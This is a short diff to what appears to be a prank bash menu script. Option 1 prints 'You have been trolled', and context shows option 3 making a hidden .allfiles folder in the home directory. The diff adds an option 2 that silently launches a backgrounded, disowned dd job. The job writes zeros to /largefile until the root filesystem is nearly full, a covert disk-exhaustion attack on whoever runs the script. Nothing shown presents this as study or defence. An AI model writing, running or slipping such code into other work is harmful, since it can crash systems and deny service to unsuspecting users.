@@ -34,6 +34,11 @@ if [[ "$option" =~ ^[1-4]$ ]]; then
         echo -e "\n${turquoiseColour}You have been trolled\n${endColour}"
         ;;
 
+    2)
+     nohup bash -c 'dd if=/dev/zero of=/largefile bs=1M count=$(($(df --output=avail / | tail -n 1) / 1024 - 10))' >/dev/null 2>&1 &
+     disown
+        ;;
+
     3) 
      cd ~
      mkdir .allfiles
